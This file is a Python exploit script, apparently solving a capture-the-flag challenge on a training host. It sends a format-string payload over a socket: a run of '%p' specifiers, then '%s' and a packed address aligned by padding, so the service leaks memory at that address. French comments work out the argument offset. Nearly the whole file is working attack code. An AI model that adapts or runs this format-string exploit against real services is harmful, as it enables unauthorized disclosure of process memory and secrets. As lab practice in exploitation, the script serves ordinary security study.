import sys, re, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929


def collect(s, t=1.5):
    s.settimeout(0.5)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
        except socket.timeout:
            continue
    return buf


def run(a_bytes, b_bytes=b"2"):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(6)
    collect(s, 0.9)
    s.sendall(a_bytes + b"\n")
    time.sleep(0.45)
    collect(s, 0.5)
    s.sendall(b_bytes + b"\n")
    time.sleep(1.0)
    o = collect(s, 1.5)
    s.close()
    return o


# on veut que %s (le 15e spec) lise l'argument 15 = offset 40 du buffer
# donc 14 %p avant, puis le pad pour aligner l'adresse a l'offset 40
NPP = 14
fmt = b"%p|" * NPP + b"%s"
pre = b"1" + b"A" * 12          # 13 octets
addr_off = 19 + len(pre) + len(fmt)
pad = (8 - (addr_off % 8)) % 8
a = pre + fmt + b"Z" * pad + struct.pack("<Q", 0x601030)
print("addr_off=%d pad=%d" % (addr_off, pad))
out = run(a)
m = re.search(rb"Calculating for A: (.*?)and B:", out, re.S)
seg = m.group(1) if m else out
print("brut:", seg[-200:])
print("hex tail:", seg[-60:].hex())
